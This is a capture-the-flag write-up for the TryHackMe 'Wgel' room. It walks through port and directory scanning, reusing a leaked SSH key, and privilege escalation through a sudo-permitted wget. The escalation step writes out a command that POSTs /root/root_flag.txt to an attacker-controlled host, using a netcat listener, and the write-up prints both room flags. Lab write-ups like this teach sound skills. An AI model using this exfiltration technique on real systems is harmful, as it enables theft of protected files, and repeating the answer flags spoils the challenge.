

# Wgel- TryHackMe Writeup

This is a writeup for Wgel from TryHackMe, which youi can find [here](https://tryhackme.com/room/wgelctf).

---


## Steps

### 1. Initial Reconnaissance
- Scanned the target:
  ```bash
  nmap -A -sV -p- [VICTIM IP]
  ```
- Example:
  ```bash
  nmap -A -sV -p- 10.10.5.177
  ```
- Flags explained:
  - `-A`: Aggressive scan (OS detection, version detection, scripts, traceroute).
  - `-sV`: Detect service versions.
  - `-p-`: Scan all 65,535 ports.
- Results:
  ```
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux)
  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
  ```
- Open ports: 2 (22 and 80).

### 2. Web Enumeration
- Ran `gobuster` with extensions:
  ```bash
  gobuster dir -u http://[VICTIM IP] -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt,.ssh
  ```
- Example:
  ```bash
  gobuster dir -u http://10.10.5.177 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt,.ssh
  ```
- Flags explained:
  - `-u`: Target URL.
  - `-w`: Wordlist path.
  - `-x .php,.txt,.ssh`: Check for these file extensions.
- Results (interrupted at 70.52%):
  ```
  /sitemap       (Status: 301)
  /server-status (Status: 403)
  ```
- Enumerated `/sitemap`:
  ```bash
  gobuster dir -u http://[VICTIM IP]/sitemap -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt,.ssh
  ```
- Results (interrupted at 38.84%):
  ```
  /images  (Status: 301)
  /.ssh    (Status: 301)
  /css     (Status: 301)
  /js      (Status: 301)
  /fonts   (Status: 301)
  ```

### 3. Discover SSH Key
- Visited `http://[VICTIM IP]/sitemap`—nothing interesting.
- Checked `http://[VICTIM IP]/sitemap/.ssh`—found an RSA private key.
- Saved it:
  ```bash
  nano id_rsa
  ```
- Pasted the key content (assumed from the site).

### 4. Crack RSA Key
- Converted to hash:
  ```bash
  /opt/john/ssh2john.py id_rsa > sigma.txt
  ```
- Found it had no passphrase—confirmed by `ssh2john.py` output or testing.

### 5. Gain SSH Access
- Struggled to find the username—tried `root`, `user`, etc., with no luck.
- After an hour, found `jessie` in the Apache site (likely a comment or page content).
- Logged in:
  ```bash
  ssh -i id_rsa jessie@[VICTIM IP]
  ```
- Example:
  ```bash
  ssh -i id_rsa jessie@10.10.5.177
  ```
- No passphrase required—successfully logged in as `jessie`.

### 6. Find User Flag
- Explored home directory:
  ```bash
  ls
  ```
- Output: `Desktop Documents Downloads ...`
- Checked subdirectories:
  ```bash
  ls Documents/
  ```
- Found `user_flag.txt`:
  ```bash
  cat Documents/user_flag.txt
  ```
- Content: `057c67131c3d5e42dd5cd3075b198ff6`

### 7. Privilege Escalation
- Checked `sudo` privileges:
  ```bash
  sudo -l
  ```
- Output:
  ```
  User jessie may run the following commands on CorpOne:
      (ALL : ALL) ALL
      (root) NOPASSWD: /usr/bin/wget
  ```
- Researched `wget` escalation: It can POST file contents to a remote server as root.
- Set up a listener on my attacker machine (`[ATTACKER IP]`, e.g., `10.10.87.244`):
  ```bash
  nc -lvnp 443
  ```
- Flags explained:
  - `-l`: Listen mode.
  - `-v`: Verbose output.
  - `-n`: No DNS resolution.
  - `-p 443`: Port to listen on.
- Ran `wget` as root to send `/root/root_flag.txt`:
  ```bash
  sudo wget --post-file=/root/root_flag.txt http://[ATTACKER IP]:443
  ```
- Example:
  ```bash
  sudo wget --post-file=/root/root_flag.txt http://10.10.87.244:443
  ```
- Listener output:
  ```
  POST / HTTP/1.1
  Content-Length: 33
  b1b968b37519ad1daa6408188649263d
  ```
- Root flag: `b1b968b37519ad1daa6408188649263d`

---

## Flags
- **User flag**: `057c67131c3d5e42dd5cd3075b198ff6`
- **Root flag**: `b1b968b37519ad1daa6408188649263d`

---

## Tools Used
- `nmap`: Port and service scanning.
- `gobuster`: Directory enumeration.
- `ssh2john.py`: RSA key passphrase checking.
- `ssh`: Remote access.
- `nc`: Netcat listener.
- `wget`: Privilege escalation.

---

## Lessons Learned
- **Web enumeration**: Hidden directories like `.ssh` can leak sensitive data.
- **SSH keys**: Unencrypted keys are a quick win—always check for passphrases.
- **`wget` exploit**: `sudo wget --post-file` can exfiltrate root files to an attacker-controlled server.
- **Persistence**: Finding the username took time—check all site content thoroughly.

---
